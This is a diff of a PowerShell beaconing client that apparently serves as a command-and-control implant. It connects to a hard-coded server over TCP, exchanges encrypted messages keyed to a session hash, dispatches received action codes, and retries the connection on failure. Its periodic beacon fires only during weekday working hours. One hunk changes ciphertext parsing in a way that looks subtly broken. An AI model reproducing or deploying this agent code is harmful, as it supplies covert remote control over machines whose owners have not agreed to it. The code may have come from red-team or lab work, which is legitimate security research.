@@ -1,19 +1,22 @@
+# Made for Powershell 5.1.22621.4111
+
 # Globals
+$global:CVER = "0.2.0"
+$global:TYPE = "ps"
 $global:client = $null
 $global:beaconIntervalInstance = $null
 $global:logStream = $null
 $global:startTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
 $global:exitProcess = $false
 $global:sentFirstBeacon = $false
-$global:SESSION_ID = $null
-$global:LOGGING = $true
-$global:CVER = "0.2.0"
-$global:TYPE = "ps"
-$global:CHUNK_SIZE = 1024
-$global:SERVER_ADDRESS = '127.0.0.1'
-$global:SERVER_PORT = 54678
-$global:MAX_RETRIES = 5
-$global:RETRY_INTERVALS = @(
+$global:sessionId = $null
+$global:logEnabled = $true
+$global:chunkSize = 1024
+$global:address = '10.0.0.129'
+$global:port = 54678
+$global:maxRetries = 5
+$global:retryMode = $false;
+$global:retryIntervals = @(
     [uint32]10000,
     [uint32]30000,
     [uint32](1 * 60 * 1000),
@@ -31,7 +34,7 @@ function Write-Log {
         [ValidateNotNullOrEmpty()]
         [string]$message
     )
-    if ($global:LOGGING -and $global:logStream) {
+    if ($global:logEnabled -and $global:logStream) {
         try {
             $timestamp = (Get-Date).ToUniversalTime().ToString("o")
             $global:logStream.WriteLine("[$timestamp] $message") | Out-Null
@@ -39,17 +42,17 @@ function Write-Log {
         }
         catch {
             Write-Error "Failed to write to log: $($_.Exception.Message)"
-            $global:LOGGING = $false
+            $global:logEnabled = $false
         }
     }
 }
 
 function Get-SessionId {
     try {
-        if (-not $global:client -or -not $global:client.Client -or -not $global:client.Client.RemoteEndPoint) {
+        if (-not $global:client -or -not $global:client.Client -or -not $global:client.Client.LocalEndPoint) {
             throw [Exception]::new("Client is not properly initialized.")
         }
-        $ipAddress = $global:client.Client.RemoteEndPoint.Address.ToString()
+        $ipAddress = $global:client.Client.LocalEndPoint.Address.ToString()
         if ($ipAddress -eq "::1") {
             $ipAddress = "127.0.0.1"
         }
@@ -60,13 +63,13 @@ function Get-SessionId {
         }
         $hashObject = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$ipAddress<>$sumIp"))
         $crypt = [BitConverter]::ToString($hashObject).Replace("-", "").Substring(0, 32).ToLower()
-        $global:SESSION_ID = $crypt
+        $global:sessionId = $crypt
     } 
     catch {
-        Write-Log "Error setting Session ID: $($_.Exception.Message)$_"
+        Write-Log "Error setting Session ID: $($_.Exception.Message)"
     }
     finally {
-        Write-Log "Session ID: $global:SESSION_ID"
+        Write-Log "Session ID: $global:sessionId"
     }
 }
 
@@ -137,7 +140,7 @@ function Unprotect-Data {
         
         $salt = [Convert]::FromBase64String($parts[0])
         $iv = [Convert]::FromBase64String($parts[1])
-        $encryptedData = [Convert]::FromBase64String($parts[2])
+        $encryptedData = [Convert]::FromBase64String($parts[3])
         
         $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
             $sharedKey, 
@@ -169,49 +172,46 @@ function Get-RetryInterval {
         [ValidateNotNullOrEmpty()]
         [int]$retries
     )
-    if ($retries -lt $global:RETRY_INTERVALS.Length) {
-        return $global:RETRY_INTERVALS[$retries-1]
+    if ($retries -lt $global:retryIntervals.Length) {
+        return $global:retryIntervals[$retries-1]
     }
     return 0
 }
 
 function Send-Command {
-    [CmdletBinding()]
     param (
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         $response
     )
     try {
-        if($global:client.Connected) {
-            # encrypt the payload
-            $encrypted = Protect-Data -data ($response | ConvertTo-Json -Depth 4) -sharedKey $global:SESSION_ID
-
+        if ($global:client.Connected) {
+            # Encrypt the payload
+            $encrypted = Protect-Data -data ($response | ConvertTo-Json -Depth 4) -sharedKey $global:sessionId
             if ($encrypted) {
-
-                # get stream
                 $tcpStream = $global:client.GetStream()
                 $writer = [System.IO.StreamWriter]::new($tcpStream)
                 $writer.AutoFlush = $true
-
-                if ($encrypted.Length -ge $global:CHUNK_SIZE) {
-                    while ($encrypted.Length -gt 0) {
-                        $chunk = $encrypted.Substring(0, [Math]::Min($global:CHUNK_SIZE, $encrypted.Length))
-                        $encrypted = $encrypted.Substring($chunk.Length)
-                        if ($encrypted.Length -eq 0) {
-                            $chunk += '--FIN--'
+                try {
+                    if ($encrypted.Length -ge $global:chunkSize) {
+                        while ($encrypted.Length -gt 0) {
+                            $chunk = $encrypted.Substring(0, [Math]::Min($global:chunkSize, $encrypted.Length))
+                            $encrypted = $encrypted.Substring($chunk.Length)
+                            if ($encrypted.Length -eq 0) {
+                                $chunk += '--FIN--'
+                            }
+                            Write-Log "Sent Chunk: $chunk"
+                            $writer.Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
                         }
-                        Write-Log "Sent Chunk: $chunk"
-                        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
+                    } else {
+                        Write-Log "Sent Data: $encrypted"
+                        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
                     }
                 }
-                else {
-                    Write-Log "Sent Data: $encrypted"
-                    $writer.Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
+                finally {
+                    $writer.Close()
+                    $writer.Dispose()
                 }
-
-                $writer.Close()
-                $writer.Dispose();
             }
         }
     }
@@ -235,7 +235,7 @@ function Send-Beacon {
     Send-Command -response $response
 }
 
-function Start-Sleep {
+function Sleep-For {
     [CmdletBinding()]
     param (
         [Parameter(Mandatory=$true)]
@@ -430,7 +430,6 @@ function Read-Action {
             'di' {
                 Write-Log "Disconnect command received. Initiating shutdown..."
                 $global:exitProcess = $true
-                Send-Command @{ response = @{ data = "Disconnecting..." } }
                 exit
             }
             'ss' {
@@ -454,68 +453,75 @@ function Read-Action {
 }
 
 function Connect-ToServer {
-    $connectionRetries = 0;
-    while(-not $global:exitProcess) {
+    $connectionRetries = 0
+
+    while (-not $global:exitProcess) {
         try {
-            if ($global:client -eq $null) {
-                $global:client = New-Object System.Net.Sockets.TcpClient($global:SERVER_ADDRESS, $global:SERVER_PORT)
+            if ($global:client -ne $null -and $global:client.Connected) {
+                # Connection is already open, continue using it
+                $tcpStream = $global:client.GetStream()
+
+                # Check if we need to send a beacon or handle data
+                if (-not $global:sentFirstBeacon) {
+                    Send-Beacon
+                    $global:sentFirstBeacon = $true
+                }
+
+                # Handle incoming data
+                $buffer = New-Object byte[] $global:chunkSize
+                while ($global:client.Connected -and $tcpStream.DataAvailable) {
+                    $bytesRead = $tcpStream.Read($buffer, 0, $buffer.Length)
+                    if ($bytesRead -eq 0) { break }
+                    $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
+                    Write-Log "Received Data: $data"
+                    $action = Unprotect-Data -encrypted $data -sharedKey $global:sessionId
+                    if ($action) {
+                        Read-Action -action $action
+                    }
+                }
+            } else {
+
+                if ($global:client -ne $null) {
+                    $global:client.Close()
+                    $global:client.Dispose()
+                    $global:client = $null
+                }
+
+                # No connection or connection is not valid; create a new one
+                Write-Log "Attempting to connect..."
+                $global:client = New-Object System.Net.Sockets.TcpClient($global:address, $global:port)
                 if ($global:client.Connected) {
                     Write-Log "Client $global:CVER connected."
                     Get-SessionId
                 }
             }
-            if (-not $global:client.Connected) {
-                $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
-            }
-
-            while ($global:client.Connected)
-            {
-                # Get tcp stream
-                $tcpStream = $global:client.GetStream()
-
-                if (-not $global:sentFirstBeacon) {
-                    Send-Beacon
-                    $global:sentFirstBeacon = $false
-                }
-
-                $buffer = New-Object byte[] $global:CHUNK_SIZE
-                $reader = [System.IO.StreamReader]::new($tcpStream)
-
-                # Parse data received
-                while (($reader.Peek() -ne -1) -or ($global:client.Available)) {
-                    $bytesRead = $reader.Read($buffer, 0, $buffer.Length)
-                    if ($bytesRead -eq 0) { break }
-                    $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
-                    Write-Log "Received Data: $data"
-                    $action = Unprotect-Data -encrypted $data -sharedKey $global:SESSION_ID
-                    if ($action) {
-                        Read-Action -action $action
-                    }
-                }
-
-                $reader.Close()
-                $reader.Dispose()
-            }
+        }
+        catch [System.Net.Sockets.SocketException] {
+            Write-Log "SocketException occurred: $($_.Exception.Message)"
+            $global:retryMode = $true
         }
         catch {
-            Write-Log "Connect-ToServer exception occurred: $($_.Exception.Message)"
-            $global:exitProcess = $true
+            Write-Log "Exception occurred: $($_.Exception.Message)"
         }
         finally {
-            Write-Log "Connection to server closing. Retrying..."
+            if ($global:retryMode -and $global:client -ne $null) {
+                Write-Log "Connection to server closing. Retrying..."
 
-            # close the client to reconnect
-            $global:client.Close()
+                # Clean up client connection
+                $global:client.Close()
+                $global:client.Dispose()
+                $global:client = $null
 
-            $connectionRetries++
-            if ($connectionRetries -gt $global:MAX_RETRIES) {
-                Write-Log "Max retries reached. Exiting."
-                $global:exitProcess = $true
-            }
-            else {
-                $retryInterval = Get-RetryInterval -retries $connectionRetries
-                Write-Log "Attempting to reconnect in $($retryInterval / 1000) seconds..."
-                Start-Sleep -Milliseconds $retryInterval
+                $connectionRetries++
+                if ($connectionRetries -gt $global:maxRetries) {
+                    Write-Log "Max retries reached. Exiting."
+                    $global:exitProcess = $true
+                    $global:retryMode = $false
+                } else {
+                    $retryInterval = Get-RetryInterval -retries $connectionRetries
+                    Write-Log "Attempting to reconnect in $($retryInterval / 1000) seconds..."
+                    Sleep-For -Milliseconds $retryInterval
+                }
             }
         }
     }
@@ -523,7 +529,7 @@ function Connect-ToServer {
 
 try {
     # Create a writable stream for logging
-    if ($clientConfig.Logging) {
+    if ($global:logEnabled) {
         $logPath = 'logs\client.log'
         $logDir = [System.IO.Path]::GetDirectoryName($logPath)
         if (-not $logDir -or -not (Test-Path -Path $logDir)) {
@@ -541,7 +547,7 @@ try {
     }
 
     # Handle sending periodic beacon
-    $beacon = Register-ObjectEvent -InputObject $global:beaconIntervalInstance -EventName Elapsed -SourceIdentifier BeaconInterval -Action {
+    $beacon = Register-ObjectEvent -InputObject $global:beaconIntervalInstance -EventName Elapsed -SourceIdentifier Clock -Action {
         $now = Get-Date
         if ($now.DayOfWeek -in 1..5 -and $now.Hour -in 7..19) {
             Send-Beacon
@@ -549,37 +555,32 @@ try {
     }
 
     # Handle SIGINT (Ctrl+C)
-    $ctrlc = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action {
+    $ctrlc = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -SourceIdentifier CtrlC -Action {
         Write-Warning 'Received SIGINT (Ctrl+C), shutting down gracefully'
-        # close log stream
-        Close-LogStream
-
-        if ($global:beaconIntervalInstance) {
-            $global:beaconIntervalInstance.Stop()
-            $global:beaconIntervalInstance.Dispose()
-        }
-        if ($global:client) {
-            $global:client.Close()
-            $global:client.Dispose()
-        }
+        $global:exitProcess = $true
     }
 
     # Connect
     Connect-ToServer
 }
+catch {
+    Write-Error "Client exception: $($_.Exception.Message)"
+}
 finally {
-    # close log stream
+    # Close log stream
     Close-LogStream
 
     if ($global:beaconIntervalInstance) {
-        Unregister-Event -SourceIdentifier BeaconInterval
         $global:beaconIntervalInstance.Dispose()
     }
-    if ($global:client) {
+
+    # Unregister events
+    Unregister-Event -SourceIdentifier Clock
+    Unregister-Event -SourceIdentifier CtrlC
+
+    # Dispose client if it's still connected
+    if ($global:client -ne $null -and $global:client.Connected) {
         $global:client.Close()
         $global:client.Dispose()
     }
-
-    $ctrlc | Remove-Job -Force
-    $beacon | Remove-Job -Force
 }
